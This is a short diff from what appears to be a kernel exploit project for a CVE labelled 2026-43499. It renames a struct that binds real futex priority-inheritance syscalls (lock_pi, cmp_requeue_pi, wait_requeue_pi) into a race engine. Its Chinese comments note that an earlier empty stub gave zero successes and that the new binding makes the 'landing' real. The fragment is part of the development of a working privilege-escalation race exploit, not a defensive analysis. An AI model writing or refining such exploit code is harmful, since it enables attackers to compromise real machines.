@@ -739,7 +739,7 @@ namespace ghostlock::backend::cve_2026_43499::landing {
         /** 真 futex landing（round 203 ✓，**关键** ✓）：`pi_race.hpp` 里默认的 `FutexOps` 是**空实现** ✗
          *  （四个方法全 `return 0` ✓）⇒ 用它时 `cmp_requeue_pi` 恒 <1 ⇒ 每轮 Refused ⇒ successes=0 ✓。
          *  这里绑定到本 route 的 ops（真 syscall ✓，val2/val3 按快照 = 1/0 ✓）。 */
-        struct SelectStackSeam final {
+        struct SelectStackLanding final {
             static std::int32_t lock_pi(std::uint32_t *word) noexcept { return Ops::lock_pi(word); }
             static std::int32_t unlock_pi(std::uint32_t *word) noexcept { return Ops::unlock_pi(word); }
             static std::int32_t cmp_requeue_pi(std::uint32_t *chain, std::uint32_t *target) noexcept {
@@ -749,7 +749,7 @@ namespace ghostlock::backend::cve_2026_43499::landing {
                 return Ops::wait_requeue_pi_until(chain, target, 2000000);
             }
         };
-        race::PiRace<SelectStackSeam> race_{};   /* 引擎绑定**真** landing ✓（此前是空实现 ✗） */
+        race::PiRace<SelectStackLanding> race_{};   /* 引擎绑定**真** landing ✓（此前是空实现 ✗） */
         std::int32_t pipe_read_ = -1;
         std::int32_t pipe_write_ = -1;
         std::int32_t timer_ = -1;
